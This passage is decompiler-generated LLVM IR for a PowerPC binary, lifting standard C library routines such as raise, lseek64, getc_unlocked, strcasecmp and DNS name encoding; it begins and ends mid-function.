  uselistorder i32* @r27, { 23, 24, 25, 26, 27, 28, 1, 29, 30, 31, 32, 12, 13, 6, 14, 3, 2, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 88, 4, 89, 7, 90, 95, 15, 16, 86, 87, 82, 83, 84, 85, 91, 92, 93, 61, 62, 63, 64, 5, 65, 66, 67, 68, 8, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 9, 10, 11, 80, 81, 94, 21, 22, 17, 18, 19, 20 }
  uselistorder i32 32, { 52, 53, 54, 32, 55, 56, 33, 57, 58, 59, 60, 23, 24, 61, 74, 62, 34, 31, 63, 64, 20, 21, 46, 47, 45, 2, 3, 4, 22, 19, 65, 66, 35, 67, 68, 69, 70, 71, 72, 73, 0, 75, 76, 48, 49, 6, 5, 37, 8, 7, 36, 10, 9, 38, 1, 27, 50, 12, 11, 39, 28, 40, 51, 41, 14, 13, 16, 25, 15, 42, 43, 18, 26, 17, 44, 29, 30 }
  uselistorder i32* @r10, { 1, 2, 0 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_100156b0, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10015680, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_1001567c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10015638, { 1, 0 }
  uselistorder label %dec_label_pc_10015630, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001560c, { 1, 0 }
  uselistorder label %dec_label_pc_100155cc, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1001555c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_100155ac, { 1, 0 }
  uselistorder label %dec_label_pc_10015544, { 1, 0 }
  uselistorder label %dec_label_pc_10015518, { 1, 0 }
  uselistorder label %dec_label_pc_100154fc, { 1, 0 }
  uselistorder label %dec_label_pc_10015464, { 1, 0 }
  uselistorder label %dec_label_pc_100153f8, { 1, 0 }
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_100156c8 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268523232, i32* @lr, align 4
  %v0_100156dc = call i32 @__libc_getpid()
  %v0_100156e4 = load i32, i32* @r29, align 4
  store i32 %v0_100156c8, i32* @lr, align 4
  %v2_100156f4 = call i32 @kill(i32 %v0_100156dc, i32 %v0_100156e4)
  ret i32 %v2_100156f4

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_100156f8 = load i32, i32* @lr, align 4
  store i32 140, i32* %r0.global-to-local, align 4
  %v0_10015724 = call i32 @__asm_mfcr()
  %v1_10015728 = and i32 %v0_10015724, 268435456
  %v3_10015728 = icmp eq i32 %v1_10015728, 0
  store i32 %v0_10015724, i32* %r31.global-to-local, align 4
  store i32 %v0_10015724, i32* %r0.global-to-local, align 4
  br i1 %v3_10015728, label %dec_label_pc_1001574c, label %dec_label_pc_1001573c

dec_label_pc_1001573c:                            ; preds = %entry
  %v0_1001573c = call i32 @__errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_10015744 = load i32, i32* %r31.global-to-local, align 4
  %v2_10015744 = inttoptr i32 %v0_1001573c to i32*
  store i32 %v0_10015744, i32* %v2_10015744, align 4
  %v0_10015750.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10015750

dec_label_pc_1001574c:                            ; preds = %entry
  %v3_10015734 = icmp eq i32 %v0_10015724, 0
  br i1 %v3_10015734, label %dec_label_pc_1001575c, label %dec_label_pc_10015750

dec_label_pc_10015750:                            ; preds = %dec_label_pc_1001574c, %dec_label_pc_1001573c
  %v0_10015750 = phi i32 [ %v0_10015724, %dec_label_pc_1001574c ], [ %v0_10015750.pre, %dec_label_pc_1001573c ]
  %tmp = icmp slt i32 %v0_10015750, 0
  %v1_10015754 = zext i1 %tmp to i32
  %v2_10015754 = ashr i32 %v0_10015750, 31
  %v3_10015754 = and i32 %v2_10015754, -2
  %v4_10015754 = or i32 %v3_10015754, %v1_10015754
  br label %dec_label_pc_10015764

dec_label_pc_1001575c:                            ; preds = %dec_label_pc_1001574c
  %v3_1001575c = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10015764

dec_label_pc_10015764:                            ; preds = %dec_label_pc_10015750, %dec_label_pc_1001575c
  %v0_10015774 = phi i32 [ %v4_10015754, %dec_label_pc_10015750 ], [ %v3_1001575c, %dec_label_pc_1001575c ]
  store i32 %v0_100156f8, i32* %r0.global-to-local, align 4
  ret i32 %v0_10015774

; uselistorder directives
  uselistorder i32 %v0_10015750, { 1, 0 }
  uselistorder i32 %v0_10015724, { 0, 3, 2, 1, 4 }
  uselistorder i32 31, { 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 1, 2, 26, 27, 28, 29, 30, 8, 9, 3, 4, 0, 6, 5, 31, 32, 33, 50, 51, 48, 49, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 7, 10, 11, 46, 47 }
  uselistorder i32 268435456, { 7, 8, 19, 11, 4, 22, 23, 24, 25, 16, 21, 5, 20, 0, 9, 10, 1, 12, 27, 17, 13, 18, 30, 6, 14, 15, 2, 3, 26, 28, 29, 31 }
  uselistorder i32 140, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10015764, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10015778 = add i32 %arg1, 128
  %v1_1001577c = mul i32 %arg1, 2
  %v2_10015780 = icmp ugt i32 %v1_10015778, 383
  %v0_10015784 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10015780, i32 %v0_10015784)
  %v3_1001578c = load i32, i32* bitcast (i32** @global_var_1002aba4.613 to i32*), align 4
  %v2_10015790 = add i32 %v1_1001577c, %v3_1001578c
  %v3_10015790 = inttoptr i32 %v2_10015790 to i16*
  %v4_10015790 = load i16, i16* %v3_10015790, align 2
  %v5_10015790 = sext i16 %v4_10015790 to i32
  ret i32 %v5_10015790
}

define i32 @getc_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  %v0_10015798 = load i32, i32* @lr, align 4
  store i32 %v0_10015798, i32* %r0.global-to-local, align 4
  %v0_100157a0 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_100157ac = add i32 %tmp, 16
  %v3_100157ac = inttoptr i32 %v2_100157ac to i32*
  %v4_100157ac = load i32, i32* %v3_100157ac, align 4
  store i32 %v4_100157ac, i32* %r9.global-to-local, align 4
  %v2_100157b0 = add i32 %tmp, 24
  %v3_100157b0 = inttoptr i32 %v2_100157b0 to i32*
  %v4_100157b0 = load i32, i32* %v3_100157b0, align 4
  store i32 %v4_100157b0, i32* %r0.global-to-local, align 4
  %v2_100157b4 = icmp ult i32 %v4_100157ac, %v4_100157b0
  br i1 %v2_100157b4, label %dec_label_pc_1001581c, label %dec_label_pc_100157bc

dec_label_pc_100157bc:                            ; preds = %entry
  %v3_100157bc = load i16, i16* %arg1, align 2
  %v4_100157bc = zext i16 %v3_100157bc to i32
  %v1_100157c0 = and i32 %v4_100157bc, 131
  store i32 %v1_100157c0, i32* %r0.global-to-local, align 4
  %v2_100157c4 = icmp ugt i32 %v1_100157c0, 128
  br i1 %v2_100157c4, label %dec_label_pc_100157dc, label %dec_label_pc_100157cc

dec_label_pc_100157cc:                            ; preds = %dec_label_pc_100157bc
  store i32 268523476, i32* @lr, align 4
  %v3_100157d0 = call i32 @__stdio_trans2r_o(i16* inttoptr (i32 128 to i16*), i32 %v4_100157ac)
  store i32 %v3_100157d0, i32* %r3.global-to-local, align 4
  %v3_100157d4 = icmp eq i32 %v3_100157d0, 0
  br i1 %v3_100157d4, label %dec_label_pc_100157cc.dec_label_pc_100157dc_crit_edge, label %dec_label_pc_100158b8

dec_label_pc_100157cc.dec_label_pc_100157dc_crit_edge: ; preds = %dec_label_pc_100157cc
  %v0_100157dc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100157dc

dec_label_pc_100157dc:                            ; preds = %dec_label_pc_100157cc.dec_label_pc_100157dc_crit_edge, %dec_label_pc_100157bc
  %v2_1001583c = phi i32 [ %v0_100157dc.pre, %dec_label_pc_100157cc.dec_label_pc_100157dc_crit_edge ], [ %tmp, %dec_label_pc_100157bc ]
  %v1_100157dc = inttoptr i32 %v2_1001583c to i16*
  %v2_100157dc = load i16, i16* %v1_100157dc, align 2
  %v3_100157dc = zext i16 %v2_100157dc to i32
  %v1_100157e0 = and i32 %v3_100157dc, 2
  store i32 %v1_100157e0, i32* %r0.global-to-local, align 4
  %v3_100157e0 = icmp eq i32 %v1_100157e0, 0
  br i1 %v3_100157e0, label %dec_label_pc_1001580c, label %dec_label_pc_100157e8

dec_label_pc_100157e8:                            ; preds = %dec_label_pc_100157dc
  %v1_100157e8 = call i32 @__asm_rlwinm(i32 %v3_100157dc, i32 2, i32 29, i32 29)
  %v1_100157ec = load i32, i32* @r31, align 4
  %v2_100157ec = add i32 %v1_100157ec, %v1_100157e8
  store i32 %v2_100157ec, i32* %r9.global-to-local, align 4
  %v1_100157f0 = add i32 %v2_100157ec, 39
  %v2_100157f0 = inttoptr i32 %v1_100157f0 to i8*
  %v3_100157f0 = load i8, i8* %v2_100157f0, align 1
  %v4_100157f0 = zext i8 %v3_100157f0 to i32
  store i32 %v4_100157f0, i32* %r0.global-to-local, align 4
  %v1_100157f4 = add nsw i32 %v3_100157dc, -1
  store i32 %v1_100157f4, i32* %r9.global-to-local, align 4
  %v1_100157f8 = trunc i32 %v1_100157f4 to i16
  %v3_100157f8 = inttoptr i32 %v1_100157ec to i16*
  store i16 %v1_100157f8, i16* %v3_100157f8, align 2
  %v0_100157fc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_100157fc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10015804 = load i32, i32* @r31, align 4
  %v2_10015804 = add i32 %v1_10015804, 40
  %v3_10015804 = inttoptr i32 %v2_10015804 to i32*
  store i32 0, i32* %v3_10015804, align 4
  br label %dec_label_pc_100158bc

dec_label_pc_1001580c:                            ; preds = %dec_label_pc_100157dc
  %v1_1001580c = add i32 %v2_1001583c, 16
  %v2_1001580c = inttoptr i32 %v1_1001580c to i32*
  %v3_1001580c = load i32, i32* %v2_1001580c, align 4
  store i32 %v3_1001580c, i32* %r9.global-to-local, align 4
  %v1_10015810 = add i32 %v2_1001583c, 20
  %v2_10015810 = inttoptr i32 %v1_10015810 to i32*
  %v3_10015810 = load i32, i32* %v2_10015810, align 4
  store i32 %v3_10015810, i32* %r0.global-to-local, align 4
  %v4_10015814 = icmp eq i32 %v3_10015810, %v3_1001580c
  br i1 %v4_10015814, label %dec_label_pc_10015828, label %dec_label_pc_1001581c

dec_label_pc_1001581c:                            ; preds = %dec_label_pc_1001580c, %entry
  %v1_100158907 = phi i32 [ %v2_1001583c, %dec_label_pc_1001580c ], [ %tmp, %entry ]
  %v0_1001581c = phi i32 [ %v3_1001580c, %dec_label_pc_1001580c ], [ %v4_100157ac, %entry ]
  %v1_1001581c = inttoptr i32 %v0_1001581c to i8*
  %v2_1001581c = load i8, i8* %v1_1001581c, align 1
  %v3_1001581c = zext i8 %v2_1001581c to i32
  store i32 %v3_1001581c, i32* %r3.global-to-local, align 4
  %v1_10015820 = add i32 %v0_1001581c, 1
  store i32 %v1_10015820, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10015890

dec_label_pc_10015828:                            ; preds = %dec_label_pc_1001580c
  %v1_10015828 = add i32 %v2_1001583c, 4
  %v2_10015828 = inttoptr i32 %v1_10015828 to i32*
  %v3_10015828 = load i32, i32* %v2_10015828, align 4
  store i32 %v3_10015828, i32* %r0.global-to-local, align 4
  %v3_1001582c = icmp eq i32 %v3_10015828, -2
  br i1 %v3_1001582c, label %dec_label_pc_10015834, label %dec_label_pc_10015844

dec_label_pc_10015834:                            ; preds = %dec_label_pc_10015828
  %v1_10015834 = or i32 %v3_100157dc, 4
  store i32 %v1_10015834, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1001583c = trunc i32 %v1_10015834 to i16
  store i16 %v1_1001583c, i16* %v1_100157dc, align 2
  br label %dec_label_pc_100158bc

dec_label_pc_10015844:                            ; preds = %dec_label_pc_10015828
  %v1_10015844 = and i32 %v3_100157dc, 768
  store i32 %v1_10015844, i32* %r0.global-to-local, align 4
  %v3_10015844 = icmp eq i32 %v1_10015844, 0
  br i1 %v3_10015844, label %dec_label_pc_10015858, label %dec_label_pc_1001584c

dec_label_pc_1001584c:                            ; preds = %dec_label_pc_10015844
  store i32 ptrtoint (i32** @global_var_1002ab90.590 to i32), i32* %r3.global-to-local, align 4
  store i32 268523608, i32* @lr, align 4
  %v4_10015854 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_1002ab90.590 to i16*), i32 %v3_1001580c)
  store i32 %v4_10015854, i32* %r3.global-to-local, align 4
  %v0_10015858.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10015858

dec_label_pc_10015858:                            ; preds = %dec_label_pc_10015844, %dec_label_pc_1001584c
  %v0_10015898 = phi i32 [ %v2_1001583c, %dec_label_pc_10015844 ], [ %v0_10015858.pre, %dec_label_pc_1001584c ]
  %v1_10015858 = add i32 %v0_10015898, 8
  %v2_10015858 = inttoptr i32 %v1_10015858 to i32*
  %v3_10015858 = load i32, i32* %v2_10015858, align 4
  store i32 %v3_10015858, i32* %r9.global-to-local, align 4
  %v1_1001585c = add i32 %v0_10015898, 12
  %v2_1001585c = inttoptr i32 %v1_1001585c to i32*
  %v3_1001585c = load i32, i32* %v2_1001585c, align 4
  store i32 %v3_1001585c, i32* %r0.global-to-local, align 4
  %v4_10015860 = icmp eq i32 %v3_1001585c, %v3_10015858
  br i1 %v4_10015860, label %dec_label_pc_10015898, label %dec_label_pc_10015868

dec_label_pc_10015868:                            ; preds = %dec_label_pc_10015858
  %v2_10015868 = add i32 %v0_10015898, 24
  %v3_10015868 = inttoptr i32 %v2_10015868 to i32*
  store i32 %v3_10015858, i32* %v3_10015868, align 4
  %v0_1001586c = load i32, i32* @r31, align 4
  store i32 %v0_1001586c, i32* %r3.global-to-local, align 4
  store i32 268523636, i32* @lr, align 4
  %v3_10015870 = call i32 @__stdio_rfill(i32 %v0_1001586c, i32 %v3_10015858)
  store i32 %v3_10015870, i32* %r3.global-to-local, align 4
  %v3_10015874 = icmp eq i32 %v3_10015870, 0
  br i1 %v3_10015874, label %dec_label_pc_100158b8, label %dec_label_pc_1001587c

dec_label_pc_1001587c:                            ; preds = %dec_label_pc_10015868
  %v0_1001587c = load i32, i32* @r31, align 4
  %v1_1001587c = add i32 %v0_1001587c, 20
  %v2_1001587c = inttoptr i32 %v1_1001587c to i32*
  %v3_1001587c = load i32, i32* %v2_1001587c, align 4
  store i32 %v3_1001587c, i32* %r0.global-to-local, align 4
  %v1_10015880 = add i32 %v0_1001587c, 16
  %v2_10015880 = inttoptr i32 %v1_10015880 to i32*
  %v3_10015880 = load i32, i32* %v2_10015880, align 4
  store i32 %v3_10015880, i32* %r9.global-to-local, align 4
  %v2_10015884 = add i32 %v0_1001587c, 24
  %v3_10015884 = inttoptr i32 %v2_10015884 to i32*
  store i32 %v3_1001587c, i32* %v3_10015884, align 4
  %v0_10015888 = load i32, i32* %r9.global-to-local, align 4
  %v1_10015888 = add i32 %v0_10015888, 1
  store i32 %v1_10015888, i32* %r0.global-to-local, align 4
  %v1_1001588c = inttoptr i32 %v0_10015888 to i8*
  %v2_1001588c = load i8, i8* %v1_1001588c, align 1
  %v3_1001588c = zext i8 %v2_1001588c to i32
  store i32 %v3_1001588c, i32* %r3.global-to-local, align 4
  %v1_10015890.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10015890

dec_label_pc_10015890:                            ; preds = %dec_label_pc_1001581c, %dec_label_pc_1001587c
  %v1_10015890 = phi i32 [ %v1_100158907, %dec_label_pc_1001581c ], [ %v1_10015890.pre, %dec_label_pc_1001587c ]
  %v0_10015890 = phi i32 [ %v1_10015820, %dec_label_pc_1001581c ], [ %v1_10015888, %dec_label_pc_1001587c ]
  %v2_10015890 = add i32 %v1_10015890, 16
  %v3_10015890 = inttoptr i32 %v2_10015890 to i32*
  store i32 %v0_10015890, i32* %v3_10015890, align 4
  br label %dec_label_pc_100158bc

dec_label_pc_10015898:                            ; preds = %dec_label_pc_10015858
  %v1_10015898 = inttoptr i32 %v0_10015898 to i16*
  store i32 %v0_10015898, i32* %r3.global-to-local, align 4
  %v2_1001589c = ptrtoint i8* %stack_var_-24 to i32
  store i32 268523688, i32* @lr, align 4
  %v5_100158a4 = call i32 @__stdio_READ(i16* %v1_10015898, i32 %v2_1001589c, i32 1)
  store i32 %v5_100158a4, i32* %r3.global-to-local, align 4
  %v3_100158a8 = icmp eq i32 %v5_100158a4, 0
  br i1 %v3_100158a8, label %dec_label_pc_100158b8, label %dec_label_pc_100158b0

dec_label_pc_100158b0:                            ; preds = %dec_label_pc_10015898
  %v3_100158b0 = load i8, i8* %stack_var_-24, align 1
  %v4_100158b0 = sext i8 %v3_100158b0 to i32
  store i32 %v4_100158b0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100158bc

dec_label_pc_100158b8:                            ; preds = %dec_label_pc_100157cc, %dec_label_pc_10015898, %dec_label_pc_10015868
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100158bc

dec_label_pc_100158bc:                            ; preds = %dec_label_pc_100158b0, %dec_label_pc_10015890, %dec_label_pc_10015834, %dec_label_pc_100157e8, %dec_label_pc_100158b8
  store i32 %v0_10015798, i32* %r0.global-to-local, align 4
  store i32 %v0_100157a0, i32* @r31, align 4
  %v0_100158cc = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100158cc

; uselistorder directives
  uselistorder i32 %v0_10015898, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1001581c, { 1, 0 }
  uselistorder i32 %v3_1001580c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_100157ec, { 1, 0 }
  uselistorder i32 %v3_100157dc, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v2_1001583c, { 1, 2, 0, 4, 3, 5 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 12, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i16* bitcast (i32** @global_var_1002ab90.590 to i16*), { 1, 0 }
  uselistorder i16* @global_var_1002a860.581, { 2, 1, 0, 3 }
  uselistorder i32 -2, { 10, 11, 12, 13, 2, 3, 5, 14, 15, 7, 1, 0, 16, 17, 18, 20, 21, 19, 22, 6, 8, 9, 4 }
  uselistorder i32 40, { 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 2, 1, 3 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 29, { 5, 6, 7, 8, 9, 10, 11, 12, 0, 1, 13, 14, 2, 3, 17, 18, 15, 16, 4 }
  uselistorder i32 128, { 6, 13, 14, 0, 1, 24, 25, 5, 4, 7, 8, 15, 16, 17, 18, 9, 19, 20, 21, 2, 11, 22, 23, 10, 3, 12 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_100158bc, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_100158b8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10015890, { 1, 0 }
  uselistorder label %dec_label_pc_10015858, { 1, 0 }
}

define i32 @__GI_strcasecmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_100158d4 = load i32, i32* bitcast (i32** @global_var_1002aba4.613 to i32*), align 4
  %v0_100158dc.pre = load i32, i32* @r3, align 4
  %v1_100158dc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_100158dc

dec_label_pc_100158dc:                            ; preds = %dec_label_pc_10015904, %entry
  %v0_100159186 = phi i32 [ %v0_100159187, %dec_label_pc_10015904 ], [ 0, %entry ]
  %v0_10015908 = phi i32 [ %v1_10015908, %dec_label_pc_10015904 ], [ %v1_100158dc.pre, %entry ]
  %v0_1001590c = phi i32 [ %v1_1001590c, %dec_label_pc_10015904 ], [ %v0_100158dc.pre, %entry ]
  %v4_100158dc = icmp eq i32 %v0_1001590c, %v0_10015908
  %.pre = inttoptr i32 %v0_1001590c to i8*
  br i1 %v4_100158dc, label %dec_label_pc_10015904, label %dec_label_pc_100158e4

dec_label_pc_100158e4:                            ; preds = %dec_label_pc_100158dc
  %v2_100158e4 = load i8, i8* %.pre, align 1
  %v3_100158e4 = zext i8 %v2_100158e4 to i32
  %v1_100158e8 = inttoptr i32 %v0_10015908 to i8*
  %v2_100158e8 = load i8, i8* %v1_100158e8, align 1
  %v3_100158e8 = zext i8 %v2_100158e8 to i32
  %v1_100158ec = mul nuw nsw i32 %v3_100158e4, 2
  %v1_100158f0 = mul nuw nsw i32 %v3_100158e8, 2
  %v2_100158f4 = add i32 %v1_100158ec, %v3_100158d4
  %v3_100158f4 = inttoptr i32 %v2_100158f4 to i16*
  %v4_100158f4 = load i16, i16* %v3_100158f4, align 2
  %v5_100158f4 = sext i16 %v4_100158f4 to i32
  %v2_100158f8 = add i32 %v1_100158f0, %v3_100158d4
  %v3_100158f8 = inttoptr i32 %v2_100158f8 to i16*
  %v4_100158f8 = load i16, i16* %v3_100158f8, align 2
  %v5_100158f8 = sext i16 %v4_100158f8 to i32
  %v2_100158fc = sub nsw i32 %v5_100158f4, %v5_100158f8
  %v4_10015900 = icmp eq i16 %v4_100158f4, %v4_100158f8
  br i1 %v4_10015900, label %dec_label_pc_10015904, label %dec_label_pc_10015918

dec_label_pc_10015904:                            ; preds = %dec_label_pc_100158dc, %dec_label_pc_100158e4
  %v0_100159187 = phi i32 [ %v2_100158fc, %dec_label_pc_100158e4 ], [ %v0_100159186, %dec_label_pc_100158dc ]
  %v2_10015904 = load i8, i8* %.pre, align 1
  %v1_10015908 = add i32 %v0_10015908, 1
  %v1_1001590c = add i32 %v0_1001590c, 1
  %v3_10015910 = icmp eq i8 %v2_10015904, 0
  br i1 %v3_10015910, label %dec_label_pc_10015918, label %dec_label_pc_100158dc

dec_label_pc_10015918:                            ; preds = %dec_label_pc_10015904, %dec_label_pc_100158e4
  %v0_10015918 = phi i32 [ %v0_100159187, %dec_label_pc_10015904 ], [ %v2_100158fc, %dec_label_pc_100158e4 ]
  ret i32 %v0_10015918

; uselistorder directives
  uselistorder i32 %v2_100158fc, { 1, 0 }
  uselistorder i32 %v0_1001590c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10015904, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10015924 = load i32, i32* @lr, align 4
  store i32 %v0_10015924, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_10015930 = load i32, i32* @r4, align 4
  store i32 %v0_10015930, i32* @r29, align 4
  %v0_10015934 = load i32, i32* @r5, align 4
  store i32 %v0_10015934, i32* %r27.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  %v3_100159a013 = icmp eq i8* %arg1, null
  store i32 %tmp, i32* @r3, align 4
  br i1 %v3_100159a013, label %dec_label_pc_100159bc, label %dec_label_pc_100159b0

dec_label_pc_10015944:                            ; preds = %dec_label_pc_100159b0
  store i32 268523848, i32* @lr, align 4
  %v3_10015944 = call i32 @__GI_strchr(i32 %v0_100159b014, i32 46)
  store i32 %v3_10015944, i32* @r30, align 4
  %v3_10015948 = icmp eq i32 %v3_10015944, 0
  %v0_1001594c = load i32, i32* @r31, align 4
  store i32 %v0_1001594c, i32* @r3, align 4
  %v2_10015950 = sub i32 %v3_10015944, %v0_1001594c
  store i32 %v2_10015950, i32* %r0.global-to-local, align 4
  br i1 %v3_10015948, label %dec_label_pc_10015958, label %dec_label_pc_10015960

dec_label_pc_10015958:                            ; preds = %dec_label_pc_10015944
  %v0_10015958 = call i32 @__GI_strlen()
  store i32 %v0_10015958, i32* %r3.global-to-local, align 4
  %sext = mul i32 %v0_10015958, 16777216
  %v1_1001595c = sdiv i32 %sext, 16777216
  store i32 %v1_1001595c, i32* %r0.global-to-local, align 4
  %v0_10015970.pre = load i32, i32* @r31, align 4
  %v0_10015980.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10015960

dec_label_pc_10015960:                            ; preds = %dec_label_pc_10015944, %dec_label_pc_10015958
  %v0_10015980 = phi i32 [ %v3_10015944, %dec_label_pc_10015944 ], [ %v0_10015980.pre, %dec_label_pc_10015958 ]
  %v0_10015970 = phi i32 [ %v0_1001594c, %dec_label_pc_10015944 ], [ %v0_10015970.pre, %dec_label_pc_10015958 ]
  %v0_1001598c = phi i32 [ %v2_10015950, %dec_label_pc_10015944 ], [ %v1_1001595c, %dec_label_pc_10015958 ]
  %v0_10015964 = load i32, i32* @r28, align 4
  %v1_10015964 = load i32, i32* %r27.global-to-local, align 4
  %v2_10015964 = sub i32 %v1_10015964, %v0_10015964
  %v1_10015968 = add i32 %v0_10015964, 1
  store i32 %v1_10015968, i32* %r11.global-to-local, align 4
  %v1_1001596c = add i32 %v2_10015964, -1
  store i32 %v0_10015970, i32* @r4, align 4
  %v0_10015974 = load i32, i32* @r29, align 4
  %v2_10015974 = add i32 %v0_10015974, %v1_10015968
  store i32 %v2_10015974, i32* @r3, align 4
  store i32 %v0_1001598c, i32* @r5, align 4
  %v2_1001597c = icmp ult i32 %v0_1001598c, %v1_1001596c
  %v1_10015980 = add i32 %v0_10015980, 1
  store i32 %v1_10015980, i32* @r31, align 4
  %v3_10015960.not = icmp ne i32 %v0_1001598c, 0
  %or.cond = and i1 %v2_1001597c, %v3_10015960.not
  br i1 %or.cond, label %dec_label_pc_1001598c, label %dec_label_pc_100159d4

dec_label_pc_1001598c:                            ; preds = %dec_label_pc_10015960
  %v3_1001598c = trunc i32 %v0_1001598c to i8
  %v4_1001598c = add i32 %v0_10015974, %v0_10015964
  %v5_1001598c = inttoptr i32 %v4_1001598c to i8*
  store i8 %v3_1001598c, i8* %v5_1001598c, align 1
  %v0_10015990 = load i32, i32* %r11.global-to-local, align 4
  %v1_10015990 = load i32, i32* %r0.global-to-local, align 4
  %v2_10015990 = add i32 %v1_10015990, %v0_10015990
  store i32 %v2_10015990, i32* @r28, align 4
  store i32 268523928, i32* @lr, align 4
  %v0_10015994 = call i32 @memcpy()
  store i32 %v0_10015994, i32* %r3.global-to-local, align 4
  %v0_10015998 = load i32, i32* @r30, align 4
  %v3_10015998 = icmp eq i32 %v0_10015998, 0
  br i1 %v3_10015998, label %dec_label_pc_100159bc, label %dec_label_pc_1001598c.dec_label_pc_100159a0_crit_edge

dec_label_pc_1001598c.dec_label_pc_100159a0_crit_edge: ; preds = %dec_label_pc_1001598c
  %v0_100159a0.pre = load i32, i32* @r31, align 4
  %v3_100159a0 = icmp eq i32 %v0_100159a0.pre, 0
  store i32 %v0_100159a0.pre, i32* @r3, align 4
  br i1 %v3_100159a0, label %dec_label_pc_100159bc, label %dec_label_pc_100159b0

dec_label_pc_100159b0:                            ; preds = %entry, %dec_label_pc_1001598c.dec_label_pc_100159a0_crit_edge
  %v0_100159b014 = phi i32 [ %v0_100159a0.pre, %dec_label_pc_1001598c.dec_label_pc_100159a0_crit_edge ], [ %tmp, %entry ]
  %v1_100159b0 = inttoptr i32 %v0_100159b014 to i8*
  %v2_100159b0 = load i8, i8* %v1_100159b0, align 1
  %v3_100159b0 = zext i8 %v2_100159b0 to i32
  store i32 %v3_100159b0, i32* %r0.global-to-local, align 4
  %v3_100159b4 = icmp eq i8 %v2_100159b0, 0
  br i1 %v3_100159b4, label %dec_label_pc_100159bc, label %dec_label_pc_10015944

dec_label_pc_100159bc:                            ; preds = %dec_label_pc_1001598c.dec_label_pc_100159a0_crit_edge, %dec_label_pc_1001598c, %dec_label_pc_100159b0, %entry
  %v0_100159bc = load i32, i32* %r27.global-to-local, align 4
  %tmp10 = icmp slt i32 %v0_100159bc, 1
  br i1 %tmp10, label %dec_label_pc_100159d4, label %dec_label_pc_100159c4

dec_label_pc_100159c4:                            ; preds = %dec_label_pc_100159bc
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_100159c8 = load i32, i32* @r28, align 4
  %v1_100159c8 = add i32 %v0_100159c8, 1
  store i32 %v1_100159c8, i32* %r3.global-to-local, align 4
  %v1_100159cc = load i32, i32* @r29, align 4
